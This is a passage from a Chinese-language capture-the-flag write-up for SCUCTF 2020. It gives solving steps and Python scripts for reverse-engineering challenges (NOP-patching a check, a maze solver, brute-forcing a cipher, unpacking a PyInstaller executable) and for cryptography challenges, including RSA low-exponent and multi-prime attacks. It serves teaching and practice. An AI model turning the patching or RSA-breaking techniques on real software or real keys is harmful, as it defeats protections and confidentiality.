src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.2.png"></p><p>顺着红线找到跳转开始处</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.3.png"></p><p>将其nop掉</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.5.png"></p><p>选中刚才用NOP填充的代码段,右键单击“复制到可执行文件”—-“选择”,在新弹出的界面上点击右键–单击“保存文件”,然后选择保存路径和文件名即可。</p><p>打开刚保存的文件,破解成功</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.4.png"></p><hr><h3 id="5-maze"><a href="#5-maze" class="headerlink" title="5.maze"></a>5.maze</h3><p>扔进IDA,F5查看main函数伪代码</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.1.png"></p><p>分析程序可以知道,要救出马老师,需要走15步</p><p><img src="https://gitee.com/see1c3y/scuctf2020/blob/master/re/re5/re5.2.png"></p><p>进一步分析,发现输入的路径需要包括‘D’(ascii码值:68)、‘U’(85)、‘R’(82)这3个字符</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.3.png"></p><p>v4是一个二维数组,也就是迷宫;当s[i] == ’D’时,v4的行下标加1,即向下走;当s[i]==‘U’时,v4的行下标减1,即向上走;当s[i] ==’R‘时,v4的列下标加1,即向右走</p><p>查看maze</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.4.png"></p><p>结合前面的分析可知,maze是一个5行10列的矩阵,编写python 脚本,得到flag:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">maze  =  <span class="hljs-string">&quot; *   *****&quot;</span> \<br>      <span class="hljs-string">&quot;   * *****&quot;</span> \<br>      <span class="hljs-string">&quot;****  ****&quot;</span> \<br>      <span class="hljs-string">&quot;*****    *&quot;</span> \<br>      <span class="hljs-string">&quot;********  &quot;</span><br><br>route = <span class="hljs-string">&quot;下右右上右右下下右下右右右下右&quot;</span><br>flag = route.replace(<span class="hljs-string">&#x27;下&#x27;</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">68</span>)).replace(<span class="hljs-string">&#x27;右&#x27;</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">82</span>)).replace(<span class="hljs-string">&#x27;上&#x27;</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">85</span>))<br>print(flag)<br></code></pre></div></td></tr></table></figure><hr><h3 id="6-decryptme"><a href="#6-decryptme" class="headerlink" title="6.decryptme"></a>6.decryptme</h3><p>这是一道算法逆向,先将附件扔进IDA分析</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.1.png"></p><p>定位关键函数encrypt,双击进入</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.2.png"></p><p>加密算法大致思路是:要求输入的字符串v6长度是32,加密函数encrypt传入的两个参数是v4和v6,v6字符串中的每一个字符经过加密,赋值给v4。<br>然后v4和buf进行比较,buf就是v6加密后的结果</p><p>查看buf:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.3.png"></p><p>考虑到flag的字符大都是字母、数字与下划线,可以进行爆破,编写脚本:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 选择ascii码值在48到122之间的字符</span><br>buf = <span class="hljs-string">&quot;34e8h9?&lt;&lt;mkCD&gt;F@DEDCzHxxKRQRNSRS&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">123</span>):<br>        v7 = j<br>        v6 = i<br>        v4 = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            v4 = <span class="hljs-number">2</span> * (v6 &amp; v7)<br>            v7 ^= v6<br>            v6 = v4<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> v4:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(v7) == buf[i]:<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-keyword">break</span><br>print(flag)<br><br></code></pre></div></td></tr></table></figure><p>得到flag:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">33c5d4954da881814420f3ba39772644<br></code></pre></div></td></tr></table></figure><hr><h3 id="7-pytrade-plus"><a href="#7-pytrade-plus" class="headerlink" title="7.pytrade-plus"></a>7.pytrade-plus</h3><p>使用pyinstxtractor.py对pytrade-plus.exe进行反编译</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python pyinstxtractor.py pytrade-plus.exe<br></code></pre></div></td></tr></table></figure><p>多出了一个目录:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.1.png"></p><p>在该目录下,找到一个app文件:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.2.png"></p><p>使用notepad++查看,发现controller字段:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.3.png"></p><p>在PYZ-00.pyz_extracted目录下找到controller.pyc,进行反编译,发现flag的加密方法:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        flag = self._view.textflag.toPlainText()<br>        flag = flag.replace(<span class="hljs-string">&#x27;scuctf&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        flag = flag.replace(<span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        flag = a2b_hex(flag)<br>        x = <span class="hljs-built_in">int</span>(flag)<br>        magicnum = <span class="hljs-number">0xA046AE0418E4646E7C383ADF588B29280C80B2DB5C320B4F5ACF096009FFC7A831D9B89CA1C65F7E1A6F9297720F7L</span><br>        <span class="hljs-keyword">if</span> (x ** <span class="hljs-number">7</span> - <span class="hljs-number">300</span> * x ** <span class="hljs-number">6</span> - x ** <span class="hljs-number">3</span>) + x == magicnum:<br>            self._view.textflag.setPlainText(<span class="hljs-string">&#x27;Yes, it is the real flag!&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-literal">None</span>._view.textflag.setPlainText(<span class="hljs-string">&#x27;NoNoNo!&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span>:<br>        self._view.textflag.setPlainText(<span class="hljs-string">&#x27;NoNoNo!&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></div></td></tr></table></figure><p>需要对方程进行求解,然后将解出的x转成16进制字符串,这里使用sympy进行方程求解:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br><br>x = symbols(<span class="hljs-string">&#x27;x&#x27;</span>)<br>magicnum = <span class="hljs-number">0xA046AE0418E4646E7C383ADF588B29280C80B2DB5C320B4F5ACF096009FFC7A831D9B89CA1C65F7E1A6F9297720F7</span><br>R1 = solve((x ** <span class="hljs-number">7</span> - <span class="hljs-number">300</span> * x ** <span class="hljs-number">6</span> - x ** <span class="hljs-number">3</span>) + x - magicnum, x)[<span class="hljs-number">0</span>]<br>a = <span class="hljs-built_in">str</span>(R1).encode()<br>b = binascii.b2a_hex(a)<br>print(b)<br><span class="hljs-comment"># scuctf&#123;39333031323433373134303932333037&#125;</span><br></code></pre></div></td></tr></table></figure><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><hr><h3 id="1-classic-1"><a href="#1-classic-1" class="headerlink" title="1.classic_1"></a>1.classic_1</h3><p>cipher = fphpgs{u3yy0_gu15_v5_gur_j0eyq_bs_py4ffvp_Pelcgb}<br>凯撒密码,位移是13</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">scuctf</span>&#123;h<span class="hljs-number">3</span>ll<span class="hljs-number">0</span>_th<span class="hljs-number">15</span>_i<span class="hljs-number">5</span>_the_w<span class="hljs-number">0</span>rld_of_cl<span class="hljs-number">4</span>ssic_Crypto&#125;<br></code></pre></div></td></tr></table></figure><hr><h3 id="2-classic-2"><a href="#2-classic-2" class="headerlink" title="2.classic_2"></a>2.classic_2</h3><p>多重编码<br>hex-&gt;base64-&gt;摩斯密码<br>解出:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">scuctf</span>%u<span class="hljs-number">7</span>b<span class="hljs-number">041918</span>fc<span class="hljs-number">1</span>ef<span class="hljs-number">6348768578</span>f<span class="hljs-number">505</span>f<span class="hljs-number">69</span>d<span class="hljs-number">197</span>%u<span class="hljs-number">7</span>d<br></code></pre></div></td></tr></table></figure><p>这里需要将%u7b改成:”{“ %u7d改成”}”,得到:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">scuctf</span>&#123;<span class="hljs-number">041918</span>fc<span class="hljs-number">1</span>ef<span class="hljs-number">6348768578</span>f<span class="hljs-number">505</span>f<span class="hljs-number">69</span>d<span class="hljs-number">197</span>&#125;<br></code></pre></div></td></tr></table></figure><hr><h3 id="3-RSA-1"><a href="#3-RSA-1" class="headerlink" title="3.RSA_1"></a>3.RSA_1</h3><p>e = 3,该题为低加密指数攻击<br>使用脚本:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: cp936 -*-</span><br><span class="hljs-keyword">import</span> gmpy2<br>e = <span class="hljs-number">3</span><br><span class="hljs-comment"># 读入 n, 密文</span><br>n = <span class="hljs-number">17076697689025821279984148703479525857912324396375097877800474725170566885465833732966897433803722770843910606215420934526050277173030062927090405120718833473629930226217051580832179577629652910778242159108718885516149768995851175071714817922775555170553827627677999093195969471873530031984433631909841287167351534954860426002075822101506835880510505034002629168205724869128357383388034971402180363910826536064357845040799329301895842061729319929568340334416516796267886218679042058969927331452548377324349084816441144473807565907927986545026739667157223640848553663532280797054758912745891410981282851031085852562257</span><br>c = <span class="hljs-number">892408374578063131162925795619920779766603018609992406621503024400320421262482556891045333045408815199768659578199823419716777827460090306221618906101139272423449131313434967763664295600593363990276765767066758967765012850672428517786210813209127040442832574380675662826137452780727264357</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;n=&#x27;</span>, n<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;c=&#x27;</span>, c<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+]Detecting m...&#x27;</span><br>result = gmpy2.iroot(c, <span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;  [-]The c has cubic root?&#x27;</span>, result[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">if</span> result[<span class="hljs-number">1</span>]: <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;  [-]The m is:&#x27;</span>, <span class="hljs-string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(result[<span class="hljs-number">0</span>]).decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[!]All Done!&#x27;</span><br></code></pre></div></td></tr></table></figure><p>得到flag:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/cry3.1.png"></p><hr><h3 id="4-RSA-2"><a href="#4-RSA-2" class="headerlink" title="4.RSA_2"></a>4.RSA_2</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">c = <span class="hljs-number">7162732898109470668490761172640544970587920562229245172318483665877098759808623298921271357899945260719802967519239</span><br>n = <span class="hljs-number">21280377217500047527333756734822477656202976970565771310208586426341167199342722337358334403397116963913950346969157</span><br>e = <span class="hljs-number">0x10001</span><br><span class="hljs-comment"># e = 65,537</span><br></code></pre></div></td></tr></table></figure><p>对n进行分解,得到三个质因子</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/rsa2.1.png"></p><p>按照RSA加密原理进行解密,编写脚本:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, long_to_bytes, getPrime<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p1 = <span class="hljs-number">199045230832669039221046041578658179479</span><br>p2 = <span class="hljs-number">319438022064098846441615805897528174851</span><br>p3 = <span class="hljs-number">334688613728124045578795340681788885633</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">7162732898109470668490761172640544970587920562229245172318483665877098759808623298921271357899945260719802967519239</span><br>n = <span class="hljs-number">21280377217500047527333756734822477656202976970565771310208586426341167199342722337358334403397116963913950346969157</span><br>fai = (p1 - <span class="hljs-number">1</span>) * (p2 - <span class="hljs-number">1</span>) * (p3 - <span class="hljs-number">1</span>)<br>d = inverse(e, fai)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>print(long_to_bytes(m))<br><span class="hljs-comment"># scuctf&#123;e063d03aff353073c24617bd4b483f90&#125;</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="5-math-1"><a href="#5-math-1" class="headerlink" title="5.math_1"></a>5.math_1</h3><p>考察中国剩余定理,脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment"># prime_list = []</span><br><span class="hljs-comment"># i = 0</span><br><span class="hljs-comment"># while (i&lt;100):</span><br><span class="hljs-comment">#     p = getPrime(256)</span><br><span class="hljs-comment">#     if p not in prime_list:</span><br><span class="hljs-comment">#         prime_list.append(p)</span><br><span class="hljs-comment">#         i += 1</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># c_list = []</span><br><span class="hljs-comment"># i = 0</span><br><span class="hljs-comment"># for i in range(100):</span><br><span class="hljs-comment">#     r = random.randint(1, prime_list[i])</span><br><span class="hljs-comment">#     c_list.append(r)</span><br><br>result = <span class="hljs-number">0</span><br>prime_list = [...]<br>c_list = [...]<br><br>x = <span class="hljs-number">0</span><br>m = <span class="hljs-number">1</span><br>MR = []<br>M = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    m *= prime_list[i]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    M.append(m // prime_list[i])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    MR.append(inverse((M[i]), prime_list[i]))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    x += M[i] * MR[i] * c_list[i]<br>result = x % m<br>print(result)<br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">True</span>):<br>    f = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">if</span> result % prime_list[i] != c_list[i]:<br>            f = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> f == <span class="hljs-number">1</span>:<br>        print(<span class="hljs-string">&quot;flag is scuctf&#123;%d&#125;&quot;</span> % (result % <span class="hljs-number">1145141145141145141145141919810</span>))<br>        <span class="hljs-keyword">break</span><br>    result += <span class="hljs-number">1</span><br><span class="hljs-comment"># flag is scuctf&#123;234970795255267031279059393553&#125;</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="6-RSA-3"><a href="#6-RSA-3" class="headerlink" title="6.RSA_3"></a>6.RSA_3</h3><p>本题与RSA_1一样,m=3,都是低加密指数攻击,使用脚本:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: cp936 -*-</span><br><span class="hljs-keyword">import</span> gmpy2<br>e = <span class="hljs-number">3</span><br><span class="hljs-comment"># 读入 n, 密文</span><br>n= <span class="hljs-number">91271647735744709097708757371810693819959773890255602892321052899291140524662404139036987856738557165460502348870154514187118388083897953512262523467951513248663220055679646915049292032986252072883347567763269025940548912246834125522235064649335386094011441612211361270863086815851273615300955370973053395447</span><br>c= <span class="hljs-number">8473924177689385097361186953656797062650227841190040965380473377780644233766714939608585534305414668494659709275756172697799483669925043356688884324887478394528746881611781366747757023562008158800275672858865552852268001893</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;n=&#x27;</span>, n<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;c=&#x27;</span>, c<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+]Detecting m...&#x27;</span><br>result = gmpy2.iroot(c, <span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;  [-]The c has cubic root?&#x27;</span>, result[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">if</span> result[<span class="hljs-number">1</span>]: <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;  [-]The m is:&#x27;</span>, <span class="hljs-string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(result[<span class="hljs-number">0</span>]).decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[!]All Done!&#x27;</span><br></code></pre></div></td></tr></table></figure><p>得到flag:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/rsa3.png"></p><hr><h3 id="7-math-2"><a href="#7-math-2" class="headerlink" title="7.math_2"></a>7.math_2</h3><p>本题为求解二次剩余方程,谷歌后找到了一个脚本:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">求解二次剩余的根</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_quadratic_field</span>(<span class="hljs-params">d, modulo=<span class="hljs-number">0</span></span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Generate quadratic field number class</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        class -- quadratic field number class</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">assert</span> (<span class="hljs-built_in">isinstance</span>(modulo, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> modulo &gt;= <span class="hljs-number">0</span>)<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QuadraticFieldNumber</span>:</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, x, y</span>):</span><br>            self.x = x % modulo<br>            self.y = y % modulo<br><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__mul__</span>(<span class="hljs-params">self, another</span>):</span><br>            x = self.x * another.x + d * self.y * another.y<br>            y = self.x * another.y + self.y * another.x<br>            <span class="hljs-keyword">return</span> self.__class__(x, y)<br><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__pow__</span>(<span class="hljs-params">self, exponent</span>):</span><br>            result = self.__class__(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">if</span> exponent:<br>                temporary = self.__class__(self.x, self.y)<br>                <span class="hljs-keyword">while</span> exponent:<br>                    <span class="hljs-keyword">if</span> exponent &amp; <span class="hljs-number">1</span>:<br>                        result *= temporary<br>                    temporary *= temporary<br>                    exponent &gt;&gt;= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> result<br><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span>(<span class="hljs-params">self</span>):</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;(&#123;&#125;, &#123;&#125; \\sqrt(&#123;&#125;))&#x27;</span>.<span class="hljs-built_in">format</span>(self.x, self.y, d)<br>    <span class="hljs-keyword">return</span> QuadraticFieldNumber<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">square_root_of_quadratic_residue</span>(<span class="hljs-params">n, modulo</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Square root of quadratic residue</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    Solve the square root of quadratic residue using Cipolla&#x27;s algorithm with Legendre symbol</span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        int -- if n is a quadratic residue,</span><br><span class="hljs-string">                   return x, such that x^&#123;2&#125; = n (mod modulo)</span><br><span class="hljs-string">               otherwise, return -1</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> modulo == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> n % modulo == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    Legendre = <span class="hljs-keyword">lambda</span> n: <span class="hljs-built_in">pow</span>(n, modulo - <span class="hljs-number">1</span> &gt;&gt; <span class="hljs-number">1</span>, modulo)<br>    <span class="hljs-keyword">if</span> Legendre(n) == modulo - <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>    t = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> Legendre(t ** <span class="hljs-number">2</span> - n) != modulo - <span class="hljs-number">1</span>:<br>        t += <span class="hljs-number">1</span><br>    w = (t ** <span class="hljs-number">2</span> - n) % modulo<br>    <span class="hljs-keyword">return</span> (generate_quadratic_field(w, modulo)(t, <span class="hljs-number">1</span>) ** (modulo + <span class="hljs-number">1</span> &gt;&gt; <span class="hljs-number">1</span>)).x<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    result = square_root_of_quadratic_residue(<span class="hljs-number">11451419198101926081719260817111</span>,<span class="hljs-number">8497980875583539713991243773941802042180496489377326522174599746685528850719812035800799014030522052269804143947777659192760008656733593814889715667890907</span>)<br>    print(result)<br>    print(<span class="hljs-string">&quot;flag is scuctf&#123;%d&#125;&quot;</span> % (result % <span class="hljs-number">1145141145141145141145141919810</span>))<br><span class="hljs-comment"># 732801025780658791900010899303199208933111943525875138490440727430546888153518985058336834409501987347490118623489611480915480075486097312160196897614257</span><br><span class="hljs-comment"># flag is scuctf&#123;362832854211699327118018596457&#125;</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="8-baby-pad"><a href="#8-baby-pad" class="headerlink" 